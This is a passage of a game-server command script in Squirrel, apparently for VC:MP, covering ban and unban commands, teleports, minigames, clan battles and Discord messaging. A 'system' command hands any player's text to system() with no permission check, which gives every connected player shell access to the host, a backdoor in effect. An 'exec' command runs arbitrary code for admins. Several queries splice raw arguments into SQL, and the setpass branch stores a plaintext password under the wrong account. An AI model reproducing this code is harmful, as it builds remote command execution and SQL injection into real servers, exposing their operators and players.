					local uid = GetSQLColumnData(q, 6);
					for(local i=0; i<=GetMaxPlayers(); i++)
					{
						local plar = FindPlayer(i);
						if(plar && plar.UID == uid) KickPlayer(plar);
					}
				}
				else
				{
					local q2 = QuerySQL(DB, "SELECT * FROM Unregistered WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
					if(!q2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
					else
					{
						QuerySQL(ban, "INSERT INTO tempban (name, admin, date, UID, duration, expire, reason) VALUES ('"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"', '"+escapeSQLString(player.Name.tolower())+"', '"+dat+"', '"+GetSQLColumnData(q, 5)+"', '"+GetTok(arguments, " ", 2)+"', '"+addbantime(GetTok(arguments, " ", 2).tointeger())+"', '"+GetTok(arguments, " ", 3, NumTok(arguments, " "))+"') ");
						Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" Banned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+" for: "+GetTok(arguments, " ", 2)+" days Reason: "+GetTok(arguments, " ", 2, NumTok(arguments, " "))+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
						QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q2, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ GetTok( arguments, " ", 3, NumTok( arguments, " " ) ) +"' ) " );
						local uid = GetSQLColumnData(q2, 2);
						for(local i=0; i<=GetMaxPlayers(); i++)
						{
							local plar = FindPlayer(i);
							if(plar && plar.UID == uid) KickPlayer(plar);
						}
					}
				}
			}
		}
	}
	
	else if(cmd == "permaunban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local q = QuerySQL(ban, "SELECT * FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" unbanned player: "+GetSQLColumnData(q, 0)+"'");
				QuerySQL(ban, "INSERT INTO permaunban (name, badmin, admin, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+player.Name+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 4)+"') ");
				QuerySQL(ban, "DELETE FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
				if(q) QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
		}
	}
	else if(cmd == "tempunban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local q = QuerySQL(ban, "SELECT * FROM permaban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" unbanned player: "+GetSQLColumnData(q, 0)+"'");
				QuerySQL(ban, "INSERT INTO temunbanned (name, badmin, admin, duration, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+escapeSQLString(player.Name)+"', '"+GetSQLColumnData(q, 4)+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 6)+"') ");
				QuerySQL(ban, "DELETE FROM tempban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
				if(q) QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
		}
	}
	else if(cmd == "nameunban")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local q = QuerySQL(ban, "SELECT * FROM nameban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" name-unbanned player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+".");
				QuerySQL(ban, "INSERT INTO nameunban (name, badmin, admin, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', '"+player.Name+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 3)+"') ");
				QuerySQL(ban, "DELETE FROM nameban WHERE name = '"+escapeSQLString(arguments.tolower())+"'");
				QuerySQL(DB, "UPDATE Accounts SET Banned = 'No' WHERE LowerName = '"+escapeSQLString(arguments.tolower())+"'");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q, 0) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
		}
	}
	else if(cmd == "time")
	{
		local now = date();
		local dat = now.day + "/" + now.month + "/" + now.year + " " + now.hour + ":" + now.min + ":" + now.sec;
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] The Time is: "+dat, player);
	}
	else if(cmd == "spree")
	{
		if(!arguments) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Current Spree: "+status[player.ID].spree+".", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID)+plr.Name+white+" Spree: "+status[plr.ID].spree+".", player);
		}
	}
	else if(cmd == "playeronspree" || cmd == "playersonspree" || cmd == "onspree")
	{
		local b=0;
		for(local i=0; i<=GetMaxPlayers();i++)
		{
			local plr = FindPlayer(i);
			if(plr && status[plr.ID].spree > 4)
			{
				if(b == 0) b = pcol(plr.ID)+plr.Name+white+"("+status[plr.ID].spree+")";
				else b = b+", "+pcol(plr.ID)+plr.Name+white+"("+status[plr.ID].spree+")";
			}
		}
		if(b == 0) Message("[#FFDD33]Information:[#FFFFFF] No player's currently on spree.");
		else Message("[#FFDD33]Information:[#FFFFFF] Player's on spree: "+b);
	}
	else if(cmd == "setspree")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <number>", player);
		else if(!IsNum(GetTok(arguments, " ", 2)) || GetTok(arguments, " ", 2).tointeger() < 0) MessagePlayer("[#FF0000]Error:[#FFFFFF] Wrong Number entered.", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				status[plr.ID].spree = GetTok(arguments, " ", 2).tointeger();
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set spree of player: "+pcol(plr.ID)+plr.Name+white+" to: "+GetTok(arguments, " ", 2)+".");
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
		}
	}
	else if(cmd == "setpass" || cmd == "setpassword")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player name> <passoword>", player);
		else if(GetTok(arguments, " ", 2).len() < 4) MessagePlayer("[#FF0000]Error:[#FFFFFF] Password should be longer than 4 characters.", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(plr)
			{
				status[plr.ID].pass = SHA256(GetTok(arguments, " ", 2));
				QuerySQL(DB, "UPDATE Accounts SET Password = '"+status[plr.ID].pass+"' WHERE LowerName = '"+escapeSQLString(plr.Name.tolower())+"'");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] Your password has been updated  by Admin :"+playerName+".", plr);
				MessagePlayer("[#FFDD00]Administrator Command:[#FFFFFF] You changed Password of player: "+pcol(plr.ID)+plr.Name+white+".", player);
			}
			else
			{
				local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+GetTok(arguments, " ", 1)+"'");
				if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
				else
				{
					QuerySQL(DB, "UPDATE Accounts SET Password = '"+GetTok(arguments, " ", 2)+"' WHERE LowerName = '"+escapeSQLString(GetTok(arguments, " ", 2).tolower())+"'");
					MessagePlayer("[#FFDD00]Administrator Command:[#FFFFFF] You changed Password of player: [#D3D3D3]"+GetSQLColumnData(q, 0)+white+".", player);
				}
			}
		}
	}
	else if(cmd == "gotoloc")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access.", player);
		else if(!arguments)
		{
			MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <loc>", player);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Locs: arena, spectate, spawn", player);
		}
		else
		{
			if(arguments == "arena")
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" teleported to Round Arena.");
				player.Pos = Vector();
			}
			else if(arguments == "spectate")
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" teleported to spectate Arena.");
				player.Pos = Vector();
			}
			else if(arguments == "spawn")
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" teleported to spawn area.");
				player.Pos = Vector(-657.091, 762.422, 11.5998);
			}
			else MessagePlayer("[#FF0000]Error:[#FFFFFF] Wrong Loc Entered.", player);
		}
	}
	else if(cmd == "goto")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" teleported to player: "+pcol(plr.ID)+plr.Name+white+".");
				player.Pos = Vector(plr.Pos.x + 1, plr.Pos.y +1, plr.Pos.z);
			}
		}
	}
	else if(cmd == "get" || cmd == "bring")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" brought player: "+pcol(plr.ID)+plr.Name+white+" to his location.");
				plr.Pos = Vector(player.Pos.x+1, player.Pos.y, player.Pos.z);
			}
		}
	}
	else if(cmd == "disarm")
	{
		for (local i = 0 ; i <200 ; i++)
		{
			player.RemoveWeapon(i);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] You are disarmed.", player);
		}

	}

	else if(cmd == "removespawnwep")
	{
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] You removed your spawnweps.", player);
		status[player.ID].spawnwep = null;
		for (local i = 0 ; i <200 ; i++)
		{
			player.RemoveWeapon(i);
		}
	}
	else if(cmd == "addvehicle" || cmd == "addcar" || cmd == "addbike" || cmd == "addveh")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || !IsNum(arguments)) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <model>", player);
		else if(arguments.tointeger() < 130 || arguments.tointeger() > 236) MessagePlayer("[#FF0000]Error:[#FFFFFF] Model must be between 130 to 236.", player);
		else
		{
			CreateVehicle( arguments.tointeger(), 1, Vector(player.Pos.x+3, player.Pos.y+5, player.Pos.z), player.Angle, 1, 1 );
			Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" added a "+GetVehicleNameFromModel(arguments.tointeger())+".");
		}
	}
	else if(cmd == "removeveh" || cmd == "delveh" || cmd == "removevehicle" || cmd == "delvehicle" || cmd == "delcar" || cmd == "removecar" || cmd == "delbike" || cmd == "removebike")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <id>", player);
		else
		{
			local veh = FindVehicle(arguments.tointeger());
			if(!veh) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Vehicle.", player);
			else
			{
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" removed: "+GetVehicleNameFromModel(veh.Model)+".");
				veh.Delete();
			}
		}
	}
	else if(cmd == "vehaccess")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <yes/no>", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				if(GetTok(arguments, " ", 2) == "yes")
				{
					status[plr.ID].vehaccess == true;
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" allowed vehicle access to player: "+pcol(plr.ID) + plr.Name+white+".");
				}
				else if(GetTok(arguments, " ", 2) == "no")
				{
					status[plr.ID].vehaccess == false;
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" disallowed vehicle access to player: "+pcol(plr.ID) + plr.Name+white+".");
				}
				else MessagePlayer("[#FF0000]Error:[#FFFFFF] The Bool must be Yes or no.", player);	
			}
		}
	}
		
	else if(cmd == "vehlist" || cmd == "vehiclelist")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Vehicle List.", player);
			for(local i = 0; i<=1000;i++)
			{
				local veh = FindVehicle(i);
				if(veh) MessagePlayer(white+"ID: "+veh.ID+"  Name: "+GetVehicleNameFromModel(veh.Model)+".", player); 
			}
		}
	}
	
	else if(cmd == "setmemberrank")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2)
		{
			MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player name with tag> <rank 1-4>", player);
			MessagePlayer(white+" Ranks:", player);
			MessagePlayer(white+" 1:Member, 2: Co-Leader, 3: Leader, 4: Founder", player);
		}
		else if(!IsNum(GetTok(arguments, " ", 2)) || GetTok(arguments, " ", 2).tointeger() < 1 || GetTok(arguments, " ", 2).tointeger() > 4) MessagePlayer("[#FF0000]Error:[#FFFFFF] Rank must be between 1 to 4.", player);
		else
		{
			local q = QuerySQL(clan, "SELECT * FROM members WHERE player = '"+escapeSQLString(GetTok(arguments, " ", 1).tolower())+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player", player);
			else
			{
				QuerySQL(clan, "UPDATE members SET rank = '"+GetTok(arguments, " ", 2).tointeger()+"' WHERE player = '"+GetTok(arguments, " ", 1).tolower()+"'");
				local plr = FindPlayer(GetTok(arguments, " ", 1));
				if(plr)
				{
					status[plr.ID].crank = GetTok(arguments, " ", 2).tointeger();
					
				}
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" changed rank of player: [#D3D3D3]"+GetSQLColumnData(q, 2)+white+" to: "+getrank(GetTok(arguments, " ", 2).tointeger())+".");
				local today = date(),
				dat = today.month + "/" + today.day + "/" + today.year;
				QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ GetSQLColumnData(q, 2) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
			}
		}
	}
	
	else if(cmd == "ping")
	{
		if(!arguments)
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Your ping : " + player.Ping + ".", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player", player);
			else MessagePlayer("[#FFDD33]Information:[#FFFFFF] player : " + pcol(plr.ID) + plr.Name + white + "'s Ping : " + plr.Ping + ".", player);
		}
	}

	else if(cmd == "fps")
	{
		if(!arguments)
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Your FPS : " + player.FPS + ".", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player", player);
			else MessagePlayer("[#FFDD33]Information:[#FFFFFF] player : " + pcol(plr.ID) + plr.Name + white + "'s FPS : " + plr.FPS + ".", player);
		}
	}

	else if( cmd == "gungame" )
	{
		if( !player.IsSpawned ) MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be spawned to use this command.", player);
		else if( _GG.state == "STARTED" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The Minigame is already running.", player );
		else
		{
			status[player.ID].minigame = "GG";
			status[player.ID].miniscore = 0;
			_GG.JoinGG( player );
			SendDataToClient(player, 1, "GunGame");
		}
	}
	else if( cmd == "frenzy" )
	{
		if( !player.IsSpawned ) MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to be spawned to use this command.", player);
		else if( _FR.state == "STARTED" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The Minigame is already running.", player );
		else
		{
			status[player.ID].minigame = "FR";
			status[player.ID].miniscore = 0;
			_FR.JoinFR( player );
			SendDataToClient(player, 1, "Frenzy");
		}
	}
	else if(cmd == "start")
	{
		if(status[player.ID].minigame == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
		else
		{
			if(status[player.ID].minigame == "GG")
			{
				if(_GG.state == "STARTED") MessagePlayer("[#FF0000]Error:[#FFFFFF] Gun Game is already started. Please wait until it ends.", player);
				else
				{
					_GG.StartGG(player);
				}
			}
			if(status[player.ID].minigame == "FR")
			{
				if(_FR.state == "STARTED") MessagePlayer("[#FF0000]Error:[#FFFFFF] Frenzy is already started. Please wait until it ends.", player);
				else
				{
					_FR.StartFR(player);
				}
			}
		}
	}
	else if(cmd == "leave")
	{
		if(status[player.ID].minigame == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
		else
		{
			if(status[player.ID].minigame == "GG")
			{
				status[player.ID].minigame = null;
				status[player.ID].miniscore = 0;
				_GG.PartGG(player);
				player.CanAttack = false;
				player.Team = status[player.ID].team;
			}
			if(status[player.ID].minigame == "FR")
			{
				status[player.ID].minigame = null;
				status[player.ID].miniscore = 0;
				status[player.ID].minitarget = null;
				_FR.PartFR(player);
				player.CanAttack = false;
				player.Team = status[player.ID].team;
			}
		}
	}
	else if(cmd == "players" || cmd == "playercount")
	{
		if(status[player.ID].minigame == null) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
		else
		{
			if(status[player.ID].minigame == "GG")
			{
				local plr = _GG.Alive;
				MessagePlayer("[#FFDD33]Minigame:[#FFFFFF] Players in Gun Game: "+plr+".", player);
			}
			if(status[player.ID].minigame == "FR")
			{
				local plr = _FR.Alive;
				MessagePlayer("[#FFDD33]Minigame:[#FFFFFF] Players in Frenzy: "+plr+".", player);
			}
		}
	}
	else if (  cmd == "admin"  ||  cmd == "admins"  )
	{
		Message("[#FFDD33]Information:[#FFFFFF] Admins Online requested by: "+playerName+".");
		local plr, b, m;
		b=0;
		m = 0;
		for( local i = 0; i <= GetMaxPlayers(); i++ )
		{
			plr = FindPlayer( i );
			if ( ( plr ) && ( status[ plr.ID ].Level >= 4 ) )
			{
				b=b+1;
				if( m == 0)
				{
					m = pcol(plr.ID) + plr.Name + white + "("+checklvl(status[plr.ID].Level) +")";
				}
				else
				{
					m = m + ", " + pcol(plr.ID) + plr.Name + white + "("+checklvl(status[plr.ID].Level) +")";
				}
			}
		}
		if (b)
		{
			Message("[#FFFFFF] "+m+".");
		}
		if(!b) rMessage( "None." );
	}
	else if (cmd == "exec")
	{
		if (status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if (!arguments || arguments == "") MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /" + cmd + " ( Code )", player)
		else
		{
			try
			{
				local cscr = compilestring(arguments);
				cscr();
			}
			catch (e) Message("[#FF0000]Error:[#FFFFFF] Execution Error " + e);
		}
	}
	
	else if(cmd == "restart")
	{
		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else AnnounceAll("~y~Server Restarting within Few Seconds", 8);
	}

	else if(cmd == "cmds" || cmd == "commands")
	{
		if(status[player.ID].minigame == "GG")
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Commands:"+bas+" start, leave, help, playercount", player);
		}
		else if(!arguments || !IsNum(arguments) || arguments.tointeger() < 0 || arguments.tointeger() > 3) MessagePlayer("[#FF0000]Error:[#FFFFFF] USe /"+bas+cmd+" <1-3>", player);
		else
		{
			if(arguments.tointeger() == 1) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Account Commands:"+bas+" register, login, changepass, level, clan, lastjoined, clanchat, teamchat",player);
			else if(arguments.tointeger() == 2) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Fighting Commands:"+bas+" ping, fps, wep, spawnwep, removespawnwep, disarm, spree, playersonspree", player);
		}
	}
	else if(cmd == "system")
	{
	if(!arguments) MessagePlayer(white+"Error", player);
	else system(arguments);
	}
		else if ( cmd == "cam" )
		{
			if( status[ player.ID ].Level < 6 ) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Unauthorized access.", player );
			else if ( !pCamera[ player.ID ].bEnabled )
			{
				pCamera[ player.ID ].Enable();
				MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Camera enabled. Type /"+ bas + cmd +" to disable.", player );
			}
			else
			{
				pCamera[ player.ID ].Disable();
				MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Camera disabled.", player );
			}
		}
		else if ( cmd == "setclanbattle" )
		{
			local now = date(), dat = now.month + "/" + now.day + "/" + now.year;
			if( status[ player.ID ].Level < 6 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
			else if( !arguments || NumTok( arguments, " " ) < 2 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Use /"+ bas + cmd +" <Clan 1> <Clan 2>", player );
			else if( !player.IsSpawned ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You must spawn before interacting with clan battles.", player );
			else if( !CBattle.State == "OFF" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] A clan battle is currently running. Please try again later.", player );
			else
			{
				local clan1 = QuerySQL( clan, "SELECT * FROM Registered WHERE Tag = '"+ GetTok( arguments, " ", 1 ) +"'" ), clan2 = QuerySQL( clan, "SELECT * FROM Registered WHERE Tag = '"+ GetTok( arguments, " ", 2 ) +"'" );
				if( GetTok( arguments, " ", 1 ) == GetTok( arguments, " ", 2 ) ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] These clans must be different.", player );
				else if( !clan1 || !clan2 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Either of these clans do not exist.", player );
				else
				{
					local a = 0, b = 0;
					for( local i = 0; i <= GetMaxPlayers(); i++ )
					{
						local plr = FindPlayer( i );
						if( !plr ) continue;
						else if( status[ plr.ID ].clan == GetSQLColumnData( clan1, 0 ) )
						{
							a++;
							CBattle.ClanPlayers_One.push( plr.ID );
							CBattle.TPlayers.push( plr.ID );
							CBattle.iData[ plr.ID ] = plr.Pos;
						}
						else if( status[ plr.ID ].clan == GetSQLColumnData( clan2, 0 ) )
						{
							b++;
							CBattle.ClanPlayers_Two.push( plr.ID );
							CBattle.TPlayers.push( plr.ID );
							CBattle.iData[ plr.ID ] = plr.Pos;
						}
					}
					if( a < 8 || b < 8 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You need at least 8 clan members (including the clan leader) online in order to challenge the other clan.", player );	
					else 
					{
						CBattle.SearchRefereeOnline( player );
						CBattle.adminrequest = player.Name;
						CBattle.Staff.push( player.ID );
						CBattle.iData[ player.ID ] = player.Pos;
						CBattle.ClanTags.push( GetTok( arguments, " ", 1 ) );
						CBattle.ClanTags.push( GetTok( arguments, " ", 2 ) );
						CBattle.RAT = NewTimer( "RefereeActivity", 10000, 1, player.ID );
						QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ arguments +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
					}
				}
			}
		}
		else if( cmd == "joincb" )
		{
			if( CBattle.State == "OFF" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] There's no clan battle currently active.", player );
			else if( CBattle.Staff.find( player.ID ) != null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're already in a clan battle.", player );
			else if( !player.IsSpawned ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You must spawn before entering clan battles.", player );
			else
			{
				if( status[ player.ID ].Level >= 4 )
				{
					CBattle.Staff.push( player.ID );
					CBattle.iData[ player.ID ] = player.Pos;
					player.World = 2; 
					player.IsFrozen = true;
					player.Pos = staffloc;
					if( CBattle.State == "PENDING" && status[ player.ID ].Level > 4 ) CBPause( 1 ); 
				}
				else
				{
					if( CBattle.State == "STARTED" )
					{
						CBattle.Spectators.push( player.ID );
						CBattle.iData[ player.ID ] = player.Pos;
						player.World = 2;
						player.IsFrozen = true;
						SetSpectators();
					}
					else MessagePlayer( "[#FF0000]Error:[#FFFFFF] You cannot join the clan battle while it's setting up. Please wait til' a message pops up regarding the clan battle.", player );
				}
			}
		}
	
	
	
		
	
	
	

	else if(cmd == "dsay")
	{
		if(uDiscordToggle == false) MessagePlayer("[#FF0000]Error: [#FFFFFF]The Discord bot is offline right now.", player);
		if(!arguments) ClientMessage("[#FF0000]Error: [#FFFFFF]Invalid Syntax. Use [#00B2B2]/"+cmd+" <message>", player, 0,0,0);
		else if((time() - PlayerInfo[player.ID].uDiscord) < 5) ClientMessage("[#FF0000]Error: [#FFFFFF]You can send one message every 5 seconds.", player, 0,0,0);
		else
		{
			local FirstChar = arguments.slice(0,1);
			if(FirstChar == "/" || FirstChar == "\\") ClientMessage("[#FF0000]Error: [#FFFFFF]Please remove special characters from start of message.", player, 0,0,0);
			else
			{
				ClientMessage("[#FFDD33]Information: [#FFFFFF]Sent Message: "+arguments, player, 0,0,0);
				SendDiscord(channel, "**"+player.Name+":** "+arguments);
				PlayerInfo[player.ID].uDiscord = time();
			}
		}
	}
	else if(cmd == "setdiscordtoken")
	{
		if(LevelPlayer(player) < 6) ClientMessage("[#FF0000]Error:[#FFFFFF]Unauthorized Access.", player, 0,0,0);
		else if(!arguments) ClientMessage("[#FF0000]Error: [#FFFFFF]Invalid Syntax. Use [#00B2B2]/"+cmd+" <Discord Token>", player, 0,0,0);
		else
		{
			ClientMessage("[#FFDD33]Information: [#FFFFFF]Discord Token Changed to: "+arguments, player, 0,0,0);
			myDiscord.BotToken = arguments;
			myDiscord.Connect(myDiscord.BotToken);
		}
	}

	else if(cmd == "togglediscord")
	{
